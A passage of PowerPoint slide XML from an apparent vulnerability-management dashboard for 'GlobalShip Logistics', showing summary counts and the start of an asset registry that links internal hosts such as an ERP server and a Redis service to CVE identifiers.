                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Critical/High</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Needs priority patching</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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2121408"/>
            <a:ext cx="228600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3208" y="2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Asset Types</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>server·service·container·DB</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2121408"/>
            <a:ext cx="2286000" cy="77724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2121408"/>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2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Linked CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Across all assets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2121408"/>
            <a:ext cx="2194560" cy="77724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38360" y="2121408"/>
            <a:ext cx="219456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8088" y="2212848"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Last Scan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2395728"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Full coverage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2999232"/>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35808"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  GlobalShip Logistics — Full Asset Registry with Context</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3310128"/>
            <a:ext cx="1202436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55848"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HOSTNAME</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3355848"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TYPE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3355848"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP ADDRESS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="3355848"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICALITY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="3355848"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="3355848"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TAGS / ROLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Rectangle 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3566160"/>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2608" y="3602736"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>erpnext-server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3602736"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3602736"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.11</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="3602736"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="3602736"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="3602736"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERP · supply-chain · Java · Log4j · CVE-2021-44228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Rectangle 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3813048"/>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2608" y="3849624"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>redis-tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3849624"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3849624"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.15</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="3849624"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="3849624"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="3849624"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis 6.0 · no-auth · tracking · port-9379 · CVE-2022-0543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Rectangle 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4059936"/>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92608" y="4096512"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kafka-logistics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4096512"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="4096512"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="4096512"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="4096512"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
